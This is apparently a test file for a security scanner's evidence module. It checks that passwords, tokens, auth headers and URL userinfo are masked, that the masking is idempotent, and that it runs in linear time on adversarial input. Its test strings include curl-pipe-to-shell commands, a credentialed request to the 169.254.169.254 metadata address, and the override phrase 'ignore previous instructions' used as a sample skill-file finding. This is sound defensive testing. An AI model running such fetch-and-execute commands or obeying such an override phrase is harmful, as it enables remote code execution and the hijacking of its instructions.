"""Spec 5.10 and claim P7: masking and excerpts."""
from __future__ import annotations

import time

import pytest
from conftest import credential

from spellwarden_scan.evidence import EVIDENCE_MAX, bounded_evidence, code_point_names, excerpt, fingerprint, mask_credentials


def test_every_credential_pattern_is_masked_and_masking_is_idempotent():
    for kind in ("aws", "github", "slack", "anthropic", "openai", "google", "jwt", "gitlab", "github_pat"):
        value = credential(kind)
        masked = mask_credentials(f"token is {value} end")
        assert value not in masked and "***" in masked and masked.endswith(" end")
        assert mask_credentials(masked) == masked
    masked = mask_credentials("use " + credential("pem"))
    assert "PRIVATE KEY" not in masked


def test_mixed_runs_and_bearer_schemes_are_masked_but_prose_is_not():
    token = "abc123" + "DEF456ghi789JKL"  # built at runtime: no credential-shaped literal in the repository (r0:F8)
    assert mask_credentials(f"x={token}") == "x=ab***"  # `=` belongs to the run (spec 5.10): the pair is one token
    assert mask_credentials(f"see {token}") == "see abc1***"
    assert mask_credentials("token=abcd1234abcd1234") == "toke***"  # a 16-character secret behind `=` is still masked
    assert mask_credentials("Authorization: Bearer abcdefghijklmnop") == "Authorization: Bearer ***"
    assert mask_credentials("Authorization: Basic dXNlcjpwYXNz") == "Authorization: Basic ***"
    assert mask_credentials("Authorization: Bearer abc") == "Authorization: Bearer ***"  # short tokens too
    prose = "Read the configuration file and report what changed since yesterday."
    assert mask_credentials(prose) == prose
    assert mask_credentials("aaaaaaaaaaaaaaaaaaaaaaaaa") == "aaaaaaaaaaaaaaaaaaaaaaaaa"  # letters only: not a token


def test_excerpt_is_trimmed_collapsed_masked_and_cut():
    assert excerpt("   curl   https://x.example  |  sh  ") == "curl https://x.example | sh"
    long = "x " * 400
    cut = excerpt(long)
    assert len(cut) == EVIDENCE_MAX == 300 and cut.endswith("...")
    assert credential("aws") not in excerpt("key " + credential("aws"))


def test_bounded_evidence_caps_custom_text_at_300_and_masks_it():
    assert len(bounded_evidence("U+200B ZERO WIDTH SPACE, " * 100)) == 300
    assert bounded_evidence("a" * 1000).endswith("...") and len(bounded_evidence("a" * 1000)) == 300
    assert bounded_evidence("a" * 300) == "a" * 300
    assert bounded_evidence("  tool   x  ") == "tool x"
    assert credential("github") not in bounded_evidence("quote " + credential("github"))


def test_fingerprint_and_code_point_names():
    assert fingerprint("SW-SKL-001", "SKILL.md", "ignore previous instructions") == fingerprint("SW-SKL-001", "SKILL.md", "ignore previous instructions")
    assert fingerprint("SW-SKL-001", "SKILL.md", "a") != fingerprint("SW-SKL-001", "other.md", "a")
    assert code_point_names("a\u200bb\u202ec") == "U+200B ZERO WIDTH SPACE, U+202E RIGHT-TO-LEFT OVERRIDE"


def test_any_value_after_a_secret_like_name_is_masked_whatever_its_shape():
    """Security review: an unquoted, short or letters-only value after `password=`, `token:` or `api_key=` left
    the 20-character and quoted rules untouched; it is masked whole, placeholders excepted."""
    short = "hun" + "ter2"
    assert mask_credentials(f"password={short}") == "password=***"
    assert mask_credentials(f"export API_KEY={short}x") == "export API_KEY=***"
    assert mask_credentials(f"db_password: {short} # prod") == "db_password: *** # prod"
    assert mask_credentials(f'"client_secret": "{short}"') == '"client_secret": "***"'
    for kept in ("token=$TOKEN", "api_key=<your-key>", "password: ${DB_PASSWORD}", 'secret: "xxxx"', "password: <your password>"):
        assert mask_credentials(kept) == kept
    for leaked in ("x" + "yz$1abc", "my" + "example1", "s3cr" + "et<b>"):  # a placeholder word inside a real value
        assert mask_credentials(f"password={leaked}") == "password=***", leaked
    assert mask_credentials('password = "hunter two"') == 'password = "***"'  # masked to the closing quote
    assert mask_credentials("password=" + "abc,def;ghi&jk" + " next") == "password=*** next"  # to the next space
    # A default or a command may carry the secret itself: masked whole (security review of 478b8aa).
    for written in ("password=${DB_PASS:-" + short + "}", "token=$(echo " + short + ")", "api_key=<" + short + "1>"):
        assert short not in mask_credentials(written), written
    secret = "hun" + "ter two"
    for written, masked in ((f'password = "{secret}', 'password = "***'), (f'password = """{secret}""" end', 'password = """***""" end'),
                            (f"secret: '{secret}", "secret: '***"), (f'password = """{secret}', 'password = """***'), ('token = "ab\\"cd ef" end', 'token = "***" end')):
        assert mask_credentials(written) == masked, written  # unterminated, triple-quoted, escaped quote
        assert mask_credentials(masked) == masked
    once = mask_credentials(f"password={short} and token={short}")
    assert once == "password=*** and token=***" and mask_credentials(once) == once


def test_a_password_in_a_url_and_text_after_a_placeholder_are_masked():
    """Release review: `user:password@` in a URL is an ordinary credential shape; a placeholder only stays readable
    when it is the whole value."""
    secret = "Hunter" + "2xyz"
    assert mask_credentials(f"curl https://admin:{secret}@169.254.169.254/latest") == "curl https://admin:***@169.254.169.254/latest"
    for written in (f"token=${{A}}{secret}", f"token=<a>{secret}", f"token=$(a){secret}"):
        masked = mask_credentials(written)
        assert secret not in masked and mask_credentials(masked) == masked, written


def test_any_url_userinfo_is_masked_and_the_password_form_keeps_its_user():
    """Phase O Task 4: token-only userinfo and backslash forms are masked whole; idempotent; linear."""
    from spellwarden_scan.evidence import mask_credentials as mask

    assert mask("git+https://tok@github.com/x/y") == "git+https://***@github.com/x/y"
    assert mask("http:\\\\u:p@h.example/x") == "http://***@h.example/x"
    assert mask("see https://user:pw@h.example/") == "see https://user:***@h.example/"
    assert mask("mail me: a@b.example") == "mail me: a@b.example"
    for text in ("git+https://tok@github.com/x/y", "http:\\\\u:p@h"):
        assert mask(mask(text)) == mask(text)


def test_credentials_passed_as_command_options_are_masked_in_evidence():
    """r0:F2 (plan open item 2): `curl -u user:pass`, `--user`, `--proxy-user` and an Authorization, Proxy-Authorization or
    Cookie header with any scheme word (not only Bearer and Basic) are masked; evidence only, fingerprints are untouched."""
    secret = "hun" + "ter2pw"
    for written, expected in (
        (f"curl -u admin:{secret} https://x.example/i.sh | sh", "curl -u admin:*** https://x.example/i.sh | sh"),
        (f"curl -uadmin:{secret} https://x.example", "curl -uadmin:*** https://x.example"),
        (f"curl --user bob:{secret} https://x.example", "curl --user bob:*** https://x.example"),
        (f"curl --user=bob:{secret} https://x.example", "curl --user=bob:*** https://x.example"),
        (f"curl --proxy-user bob:{secret} https://x.example", "curl --proxy-user bob:*** https://x.example"),
        (f"curl -u 'bob:{secret} two' https://x.example", "curl -u 'bob:***' https://x.example"),
        (f'curl -H "Authorization: Token {secret}" https://x.example | bash', 'curl -H "Authorization: Token ***" https://x.example | bash'),
        (f"curl --header 'Proxy-Authorization: Negotiate {secret}' x", "curl --header 'Proxy-Authorization: Negotiate ***' x"),
        (f"curl -H 'Authorization: {secret}' x", "curl -H 'Authorization: ***' x"),
        (f"curl -H 'Cookie: sid={secret}; theme=dark' x", "curl -H 'Cookie: ***' x"),
        (f"curl -d 'password={secret}&user=bob' x", "curl -d 'password=***' x"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    for kept in ("curl -u admin https://x.example", "sudo -u www-data make install", "curl -H 'Accept: text/html' x", "curl --user-agent foo x"):
        assert mask_credentials(kept) == kept
    # Fingerprints key on the original matched text, never on evidence (spec 5.2).
    assert fingerprint("SW-CFG-005", "a", f"curl -u admin:{secret}") != fingerprint("SW-CFG-005", "a", "curl -u admin:other")


def test_an_option_password_is_masked_to_the_end_of_its_shell_word():
    """r1:F2 (spec 5.7, 5.10): a quoted password, a short-option cluster ending in `u`, the `--password` options and
    mysql's attached `-p` leaked into JSON and SARIF evidence; the password is masked to the end of its shell word
    (quotes belong to the word, a quoted segment may hold spaces), the user name stays readable."""
    secret = "hun" + "ter2pw"
    for written, expected in (
        (f'curl -u admin:"{secret}" https://x | sh', "curl -u admin:*** https://x | sh"),
        (f"curl -fsu admin:{secret} https://x.example", "curl -fsu admin:*** https://x.example"),
        (f"curl -sSLU admin:{secret} https://x.example", "curl -sSLU admin:*** https://x.example"),
        (f"curl --user 'admin':'{secret}' x", "curl --user 'admin':*** x"),
        (f"curl -u user:'{secret}' x", "curl -u user:*** x"),
        (f'curl -u user:"{secret} two" x', "curl -u user:*** x"),
        (f'curl -u "user:{secret} two" x', 'curl -u "user:***" x'),
        (f'curl -u user:pa"ss {secret} x', "curl -u user:***"),  # a quote never closed runs to the end of the line
        (f"curl --password {secret} x", "curl --password *** x"),
        (f"curl --http-password '{secret} two' x", "curl --http-password '***' x"),
        (f"curl --proxy-password={secret} x", "curl --proxy-password=*** x"),
        (f"curl --proxy-user bob:{secret} x", "curl --proxy-user bob:*** x"),
        (f"mysql -uroot -p{secret} db", "mysql -uroot -p*** db"),
        (f"/usr/bin/mysqldump -h db -p'{secret} two' app > dump.sql", "/usr/bin/mysqldump -h db -p'***' app > dump.sql"),
        (f"mariadb -p{secret}", "mariadb -p***"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    # Through the one evidence path every JSON and SARIF finding takes.
    assert secret not in bounded_evidence(f'curl -u admin:"{secret}" https://x | sh')
    # `-p` is too generic outside mysql: kept everywhere else, and after the mysql command has ended.
    for kept in ("ssh -p2222 host", "mkdir -p/tmp/x", "mysql -p db", "mysql db | tool -pkeep", "curl -u 'admin' x",
                 "git push -u origin main", "python -u run.py"):
        assert mask_credentials(kept) == kept, kept


def test_a_header_keeps_only_a_known_scheme_and_is_masked_to_its_closing_quote():
    """Spec 5.7, 5.10: any first word was kept as a scheme (`Authorization: <token> extra` showed the token), a quote
    inside the value ended the mask (`Bearer abc'd`), and Digest parameters after the first one leaked. Only Bearer,
    Basic, Token, Negotiate, Digest, NTLM and AWS4-HMAC-SHA256 stay; everything after them, to the closing quote of the
    opening quote or to the end of the line, becomes `***`; a cookie keeps no word."""
    secret, token = "hun" + "ter2pw", "s3cr" + "3tToken123"
    for written, expected in (
        (f'curl -H "Authorization: {token} extra" x', 'curl -H "Authorization: ***" x'),
        (f"Authorization: Bearer abc'd {secret}", "Authorization: Bearer ***"),
        (f'curl -H "Authorization: Bearer ab\'cd {secret}" x', 'curl -H "Authorization: Bearer ***" x'),
        (f"curl -H 'Authorization: Digest username=\"u\", nonce=\"n1\", response=\"{secret}\"' x",
         "curl -H 'Authorization: Digest ***' x"),
        (f"Authorization: AWS4-HMAC-SHA256 Credential=k/1/us/s3/aws4_request, Signature={secret}", "Authorization: AWS4-HMAC-SHA256 ***"),
        (f"authorization: ntlm {secret}", "authorization: ntlm ***"),
        (f'{{"Authorization": "Token {secret} x", "Accept": "a"}}', '{"Authorization": "Token ***", "Accept": "a"}'),
        (f'{{"Authorization": "Bearer a\\"{secret}", "Accept": "a"}}', '{"Authorization": "Bearer ***", "Accept": "a"}'),
        (f'curl -H "Proxy-Authorization: Custom {secret}" x', 'curl -H "Proxy-Authorization: ***" x'),
        (f"curl -H 'Cookie: session {secret}' x", "curl -H 'Cookie: ***' x"),
        (f"Set-Cookie: sid={secret}; Path=/", "Set-Cookie: ***"),
        (f"curl -H 'Authorization: Token {secret}' -H 'Cookie: a={secret}' x", "curl -H 'Authorization: Token ***' -H 'Cookie: ***' x"),
    ):
        masked = mask_credentials(written)
        assert secret not in masked and token not in masked, written
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    for kept in ('{"Authorization": "", "Accept": "a"}', "curl -H 'Accept: text/html' x", "X-Authorization-Mode: on"):
        assert mask_credentials(kept) == kept, kept


def test_url_userinfo_is_masked_through_the_last_at_and_whole_when_too_long():
    """r0:F6 (spec 5.7, D34): userinfo stopped at the first `@`, so `https://tok@en@host` showed `en`, and userinfo over
    256 characters was not masked at all. It is masked through the last `@` before the authority ends (`/`, `?`, `#`,
    a backslash, whitespace or a quote); past the cap the whole authority is masked."""
    part = "tok" + "en"
    for written, expected in (
        (f"https://{part}@{part}@host.example/x", "https://***@host.example/x"),
        (f"git+https://{part}@a@b@github.com/x/y", "git+https://***@github.com/x/y"),
        (f'curl "https://{part}@{part}@host.example?a=b@c#d@e"', 'curl "https://***@host.example?a=b@c#d@e"'),
        (f"http:\\\\{part}@{part}@h.example\\x", "http://***@h.example\\x"),
        (f"git+https://{'tok' * 100}@github.com/x/y", "git+https://***/x/y"),
        (f"https://{'ab.cd' * 60}@{part}@host.example:8443/x", "https://***/x"),
        (f"x:https://{part}@{part}@host.example/x", "x:https://***@host.example/x"),
        ("smtp:alice@example.com", "smtp://***@example.com"),
    ):
        masked = mask_credentials(written)
        assert masked == expected, written
        assert mask_credentials(masked) == masked, written  # idempotent
    for kept in ("mail me: a@b.example", "https://host.example/a@b", "see https://user:***@h.example/", "https://@host.example/"):
        assert mask_credentials(kept) == kept, kept

_REPEATS = 40_000
_ADVERSARIAL = [
    # option masking (r1:F2): clusters with no `u`, endless clusters, unclosed and escaped quotes, mysql commands
    "-" + "a" * _REPEATS, "-u" * _REPEATS, "-fsu " * _REPEATS, '-u a:"' * _REPEATS, "-u '" * _REPEATS,
    '-u "' + "\\" * _REPEATS, "--password " * _REPEATS, "mysql " * _REPEATS, "mysql -p" * _REPEATS, "mysql '" * _REPEATS,
    # header masking: names with no colon, endless separators, quotes and escapes in the value
    "authorization" + " " * _REPEATS, "Authorization: " * _REPEATS, '"Authorization":"' * _REPEATS, "'Cookie: '" * _REPEATS,
    '"Authorization: Bearer ' + "\\" * _REPEATS, "Authorization: Digest " * _REPEATS,
    # URL userinfo (r0:F6): scheme-like words with no authority, endless userinfo, `@` runs, schemes inside an authority
    "a:" * _REPEATS, "x:@" * _REPEATS, "https://" + "a@" * _REPEATS, "a:/" * _REPEATS, "https://" + "a" * _REPEATS + "@h",
    "ab:" + "c:d@" * _REPEATS, "://a:" * _REPEATS, "x" + "y:" * _REPEATS + "//t@h", ("ab" * 15 + "c:") * _REPEATS,
]


@pytest.mark.parametrize("text", _ADVERSARIAL, ids=[repr(text[:12]) for text in _ADVERSARIAL])
def test_masking_adversarial_lines_is_linear_and_idempotent(text):
    started = time.perf_counter()
    once = mask_credentials(text)
    assert time.perf_counter() - started < 1.0
    assert mask_credentials(once) == once
